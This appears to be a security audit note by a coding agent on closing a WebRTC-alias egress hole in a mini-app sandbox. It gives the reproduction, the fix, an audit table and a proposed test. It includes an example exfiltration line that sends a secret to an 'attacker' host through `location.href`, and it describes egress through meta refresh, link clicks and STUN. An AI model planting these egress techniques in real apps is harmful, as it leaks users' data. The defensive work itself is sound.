# WebRTC alias egress in the mini-app sandbox (2026-09-14)

Status: fixed in `src/runtime/web/neutralize.js` + `src/runtime/web/probes.js` (uncommitted; the
human commits). One audit item — frame self-navigation — is **not** closed and needs an
architectural decision (see the last section). On-device confirmation is deferred to an attended
run (Android System WebView + iOS WKWebView).

## The finding

`src/runtime/web/neutralize.js` value-strips `RTCPeerConnection` because WebRTC is not covered by
the CSP's `connect-src 'none'` — the strip is the only leg that closes it. It did **not** strip the
prefixed alias `webkitRTCPeerConnection`. In current Chromium (Playwright 1.60.0, Chrome 148) the
alias is a live constructor. A generated mini-app that does `new webkitRTCPeerConnection({iceServers:
[{urls:'stun:HOST'}]})` opens a real UDP transport (STUN/ICE) that reaches the network. Because the
Android System WebView is Chromium and neutralization is the only barrier on-device (no proxy pin, no
interception — those exist only in the server-side synthetic-run harness), this was a live egress
channel for any generated mini-app.

The containment verdict stayed **CONTAINED** the whole time because `probes.js` only exercised
`RTCPeerConnection` (network section + the T1 self-injected-script check). The alias was never
probed, so the oracle could not see the hole.

## Reproduction (end to end, real production runtime page)

Method: assemble the page with the shipping `build/assemble.mjs` (`buildSrcdoc` + `buildOuterHtml`,
channel b) from `src/runtime/generated/runtime-artifacts.json`'s `parts` — the exact bytes the RN
`RUNTIME_HTML` is built from — deliver a candidate bundle the way the runtime delivers (channel-b
inline `<script>`), and launch **plain** Chromium (no proxy pin / no `--force-webrtc-ip-handling-policy`
/ no route interception) so surgical neutralization is the only barrier, i.e. the on-device
condition. The candidate is a real `defineApp` mini-app whose module scope runs the STUN handshake;
a `node:dgram` UDP socket on `127.0.0.1` is the canary (any datagram is a leak — a STUN binding
request is a datagram).

### Before the fix

```
=== candidate uses new RTCPeerConnection(...) ===
  title            : WHIM:CONTAINED
  __REPRO__.attempt: promise-rejected:TypeError
  neutralize.RTCPeerConnection      : redefined
  neutralize.webkitRTCPeerConnection: (absent from report)
  UDP datagrams to canary during this run: 0
  VERDICT: no datagrams (blocked)

=== candidate uses new webkitRTCPeerConnection(...) ===
  title            : WHIM:CONTAINED           <-- verdict still says contained
  __REPRO__.attempt: constructed+gathered
  neutralize.RTCPeerConnection      : redefined
  neutralize.webkitRTCPeerConnection: (absent from report)
  UDP datagrams to canary during this run: 4  from=["127.0.0.1:53206", ...]
  VERDICT: LEAK — datagrams reached the canary
```

### After the fix

```
=== candidate uses new webkitRTCPeerConnection(...) ===
  title            : WHIM:CONTAINED
  __REPRO__.attempt: promise-rejected:TypeError
  neutralize.RTCPeerConnection      : redefined
  neutralize.webkitRTCPeerConnection: redefined     <-- now stripped
  UDP datagrams to canary during this run: 0
  VERDICT: no datagrams (blocked)
```

## The fix (surgical)

`src/runtime/web/neutralize.js`, in the network-primitives block, after the `RTCPeerConnection`
strip:

```js
for (const rtcAlias of ['webkitRTCPeerConnection', 'mozRTCPeerConnection']) {
  if (rtcAlias in window) report[rtcAlias] = neutralize(rtcAlias, throwingFn(rtcAlias));
}
```

Same window-level, non-configurable value-strip as the existing entries (`Object.defineProperty`
with `configurable:false`), so it survives a fresh top-level `<script>` (pen-test T1). It strips only
the aliases the engine actually defines — on WebKit/iOS `webkitRTCPeerConnection` is absent (verified
below), so we do not mint a phantom throwing global there that a `typeof` feature-detect would trip
over. `mozRTCPeerConnection` is Firefox-only (absent on Chromium and WebKit); included defensively,
stripped only if present. This keeps the three legs intact: no CSP change, no value-replacement of
`Function`/`eval`, iframe stays opaque-origin sandboxed.

Not touched, on purpose:

- The **lexical shadow** lists in `loader.js` (`wrappedBundleSource`) and `build/assemble.mjs`
  (`wrapBundle`) still name only `RTCPeerConnection`. Those are belt-and-suspenders (CLAUDE.md /
  spike2 constraint #1); the window-level strip is the real defense and is what the probes exercise.
  `build/*` is owner/gate-protected, and the two lists must stay byte-in-sync, so widening the shadow
  is left to the owner. The alias is fully closed by the window strip regardless — the audit and the
  negative control both confirm it.

## Nested realms

`neutralize.js` runs once, in the top realm. A child browsing context the bundle creates would carry
pristine, un-neutralized network globals — so if a nested realm were reachable it would be a bypass
for `RTCPeerConnection` and every alias at once. It is not reachable: the locked CSP
(`frame-src 'none'`, `child-src 'none'`) plus the opaque-origin sandbox deny the child frame. In the
audit, `document.body.appendChild(iframe)` throws `SecurityError` on both Chromium and WebKit, for
both a blank and a `srcdoc` child. The new `probes.js` check `nested-realm WebRTC ctor via child
iframe` (an `expectUnreachable`) locks this: it tries to read a usable WebRTC constructor out of a
child iframe and passes only when the frame creation is denied or yields nothing. It is discriminating
— if the `frame-src`/`child-src` CSP leg were ever weakened, the child realm's real (un-neutralized)
constructor would surface here and flip the verdict.

## Audit table (candidate realm, bare browser — only the three legs in play)

Measured from inside the delivered candidate realm on the real runtime page, plain browser (no
harness network layers). HTTP canary counts TCP connections; UDP canary counts datagrams. "0 hits" =
blocked.

| Channel | Engine | Result | Evidence |
|---|---|---|---|
| `new webkitRTCPeerConnection` (STUN/ICE, UDP) | Chromium | LEAK before → **blocked after** | 4 datagrams to UDP canary before; `threw:TypeError` + 0 datagrams after |
| `new webkitRTCPeerConnection` | WebKit | absent (no leak) | `typeof === undefined`; ctor throws |
| `new RTCPeerConnection` (STUN/ICE, UDP) | Chromium, WebKit | blocked (neutralize) | `threw:TypeError`, 0 datagrams |
| `new mozRTCPeerConnection` | Chromium, WebKit | absent (Firefox-only) | `typeof === undefined` |
| `new RTCDataChannel()` (no peer) | Chromium, WebKit | blocked (no public ctor) | `threw:TypeError` |
| nested child iframe realm (blank + srcdoc) | Chromium, WebKit | blocked (CSP frame-src/child-src 'none') | `appendChild` → `SecurityError` |
| `new WebTransport` (HTTP/3, UDP) | Chromium, WebKit | blocked (CSP connect-src) | ctor `threw:TypeError`, 0 UDP |
| `new WebSocket` | Chromium, WebKit | blocked (neutralize + connect-src) | `threw:TypeError`, 0 hits |
| `new EventSource` | Chromium, WebKit | blocked (neutralize) | `threw:TypeError` |
| `navigator.sendBeacon` | Chromium, WebKit | blocked (neutralize) | `threw:TypeError` |
| `<img src=http:>` | Chromium, WebKit | blocked (CSP img-src data:) | appended, 0 HTTP hits |
| CSS `@import` / `url()` | Chromium, WebKit | blocked (CSP style-src/default-src) | appended, 0 HTTP hits |
| `<link rel=dns-prefetch/preconnect/prefetch/preload>` | Chromium, WebKit | blocked (CSP default-src 'none') | appended, 0 HTTP hits |
| external `<link rel=stylesheet>` | Chromium, WebKit | blocked (CSP style-src) | appended, 0 HTTP hits |
| `window.open` popup | Chromium, WebKit | blocked (sandbox has no allow-popups) | returns `null` |
| `<form action=http:>` submit | Chromium, WebKit | blocked (CSP form-action 'none') | submitted, 0 HTTP hits |
| **frame self-navigation** `location.assign` / `location.href` | Chromium, WebKit | **NOT BLOCKED — egress** | GET reached canary (`/loc-assign`, `/loc-href`) |
| **`<meta http-equiv=refresh>`** | Chromium, WebKit | **NOT BLOCKED — egress** | GET reached canary (`/meta`) |
| **`<a href>` click navigation** | Chromium, WebKit | **NOT BLOCKED — egress** | GET reached canary (`/a-nav`) |

fetch / XMLHttpRequest / localStorage / sessionStorage / indexedDB / caches / Worker / SharedWorker
are covered by the existing probes and neutralize entries (unchanged here).

## Open item — frame self-navigation is a live egress channel (needs an architectural decision)

A sandboxed `allow-scripts` iframe may navigate **its own** browsing context. None of the three legs
stops it: the CSP has no directive for document navigation of the frame itself (`connect-src` /
`default-src` do not govern it, and `navigate-to` is removed), the sandbox has no token that denies
self-navigation, and neutralization cannot strip `location` without breaking the runtime. A malicious
mini-app can therefore do `location.href = 'http://attacker/?d=' + encodeURIComponent(secret)` (or a
`<meta refresh>`, or an `<a>` click) and issue a GET carrying exfiltrated data. It is one-shot (it
destroys the running app), but the request — and its query string — already left. This reached the
canary on both Chromium and WebKit.

Why it hasn't bitten yet: the **server-side** synthetic-run harness blocks it with the proxy pin +
route interception (`synthrun/test/isolation.ts` already fires `location.href` and `<meta refresh>`
at its canary and relies on those layers). The **on-device** runtime has no equivalent — the
`<WebView>` in `src/host/launcher/MiniAppView.tsx` and `DevProbeScreen.tsx` sets no
`onShouldStartLoadWithRequest`.

This is out of scope for a surgical `neutralize.js` change and I did not implement it. Proposed
direction for the owner (an architectural change, not a redesign): add an
`onShouldStartLoadWithRequest` handler on the mini-app `<WebView>` that cancels any load whose URL is
not the initial mini-app document (data URL). Caveat to verify on-device: react-native-webview's
`onShouldStartLoadWithRequest` does not reliably fire for **sub-frame** (iframe) navigations on all
Android versions, so this may need `shouldOverrideUrlLoading` behavior confirmed, or a
belt-and-suspenders `sandbox` without any navigation-enabling token plus a check that the srcdoc frame
cannot reach the network on nav. Do not ship the mini-app runtime to production without closing this.

## On-device confirmation (deferred, attended run)

The desktop Chromium/WebKit runs above are the fast filter; the authoritative verdict is the real
WebView. The attended run should check, inside a delivered mini-app:

1. `new webkitRTCPeerConnection({iceServers:[{urls:'stun:<host-canary>'}]})` on the **Android System
   WebView** sends **zero** UDP datagrams to a host-run canary (it is the Chromium engine where the
   alias exists). Confirm `window.__WHIM_NEUTRALIZE_REPORT__.webkitRTCPeerConnection === 'redefined'`.
2. The same on **iOS WKWebView**: confirm `typeof webkitRTCPeerConnection` (absent → nothing to
   strip; the guard means the report simply omits it) and that `RTCPeerConnection` is stripped.
3. The on-screen containment verdict is CONTAINED at the new probe total (49 desktop) and includes
   the `webkitRTCPeerConnection` and `nested-realm WebRTC ctor` probes as PASS.
4. **Frame self-navigation**: `location.href = 'http://<host-canary>/x'` from a mini-app — does the
   Android/iOS WebView issue the request? This is the open item above; capture the answer to size the
   navigation-guard work.

## Probe count and where it is asserted

New probe total: **49** (was 47). Added: `network / webkitRTCPeerConnection (prefixed alias)` and
`escape / nested-realm WebRTC ctor via child iframe`; the T1 self-injected-script check gained a
`wrtc=` field but is still one record.

No code asserts an exact probe integer — the count appears only in the runtime status string
(`passed/total`) rendered by `build/assemble.mjs` and in prose docs. The `invariants/` suite gates on
`contained === true`, not on a number. Two **owner-authored** prose references are now stale and
should be updated by the owner (this agent does not edit `invariants/`):

- `invariants/sandbox-isolation/README.md` (says "42/42 probes")
- `DEVLOG.md` §"What held on-device" (says "42/42 probes")

(Both were already stale at 42 vs the actual 47 before this change; they become 49.)

## Negative control

With the fix removed (the alias-strip `for` loop replaced by a no-op `for (const rtcAlias of [])`),
rebuilt, and re-run:

```
FAIL b-tip (channel b: render + contain + tap round-trip): contained=false 47/49 ...
❌ 5 invariant regression(s).
```

The two alias-dependent probes fail and the verdict flips to `contained=false`; the nested-realm
probe stays green (CSP blocks it independently), which is the correct decomposition. Restoring the
loop returns the suite to `49/49` / all green. The reproduction script confirms the same at the
datagram level (0 datagrams with the fix, 4 without).

## Proposed `invariants/` test (owner to apply — feature agents do not author invariants)

The in-realm probe now covers the alias, so the existing `invariants` suite already gates it via the
trusted-vantage verdict. Stronger, F4-robust owner addition: an **out-of-band UDP canary** that
proves a webkit-RTC hostile candidate emits zero datagrams on a **bare** browser (neutralization as
the only barrier — the on-device condition, which the harness-layer synthrun test does not isolate).
Proposed diff against `invariants/sandbox-isolation/run-against-build.mjs`:

```diff
@@
 import { chromium } from 'playwright';
 import { readFile, writeFile, mkdir } from 'node:fs/promises';
+import dgram from 'node:dgram';
+import { build as esbuild } from 'esbuild';
 import { fileURLToPath, pathToFileURL } from 'node:url';
 import { dirname, join } from 'node:path';
 import { buildSrcdoc, buildOuterHtml } from '../../build/assemble.mjs';
@@
 await browser.close();
+
+// N. WebRTC-alias egress (docs/security/2026-09-14-webrtc-alias.md): a candidate that constructs
+//    `webkitRTCPeerConnection` with a STUN server on a loopback UDP canary must send ZERO datagrams.
+//    Bare Chromium (no proxy pin / no --force-webrtc-ip-handling-policy / no interception) so the
+//    window-level neutralize strip is the ONLY barrier — the Android-System-WebView condition.
+{
+  const canary = dgram.createSocket('udp4');
+  let datagrams = 0;
+  canary.on('message', () => { datagrams++; });
+  await new Promise((r) => canary.bind(0, '127.0.0.1', r));
+  const host = `127.0.0.1:${canary.address().port}`;
+  const src = `import { defineApp, Screen, Stack, Heading } from 'vc-sdk';
+declare const webkitRTCPeerConnection: any;
+try {
+  const pc = new webkitRTCPeerConnection({ iceServers: [{ urls: 'stun:${host}' }] });
+  pc.createDataChannel('leak');
+  pc.createOffer().then((o:any) => pc.setLocalDescription(o));
+} catch (e) {}
+function Home(){ return <Screen><Stack><Heading size="title">rtc</Heading></Stack></Screen>; }
+export default defineApp({ name:'rtc', initial:'Home', screens:{Home}, capabilities: [] });`;
+  const outdir = join(HERE, '.build-pages');
+  await mkdir(outdir, { recursive: true });
+  const entry = join(outdir, 'webkit-rtc.app.tsx');
+  await writeFile(entry, src);
+  const built = await esbuild({
+    entryPoints: [entry], bundle: true, format: 'iife', globalName: '__WHIM_APP_MODULE__',
+    platform: 'browser', target: 'es2019', tsconfigRaw: '{}',
+    jsx: 'transform', jsxFactory: 'React.createElement', jsxFragment: 'React.Fragment',
+    inject: [join(ROOT, 'build/react-inject-shim.ts')],
+    external: ['vc-sdk', 'react', 'react-dom', 'react-dom/client'], write: false, logLevel: 'warning',
+  });
+  const js = built.outputFiles.find((f) => !f.path.endsWith('.map')).text;
+  const page = buildOuterHtml({ srcdoc: srcdocB, bundles: { 'webkit-rtc': js }, initial: 'webkit-rtc', channel: 'b' });
+  const file = await writePage('webkit-rtc', page);
+  const bare = await chromium.launch(); // bare: neutralization is the only barrier
+  const p = await bare.newPage();
+  await p.goto(pathToFileURL(file).href, { waitUntil: 'load', timeout: 20000 });
+  await p.waitForTimeout(3000);
+  await bare.close();
+  await new Promise((r) => canary.close(r));
+  record(datagrams === 0, 'webkit-rtc alias egress (bare browser, out-of-band UDP canary)',
+    `datagrams to canary=${datagrams} (must be 0) — value-strip of webkitRTCPeerConnection`);
+}
```

Note the negative-control property: this check goes red when the `neutralize.js` alias strip is
removed (datagrams reach the canary), independent of the in-realm probe, so it also guards against a
future refactor that keeps the probe but drops the strip.
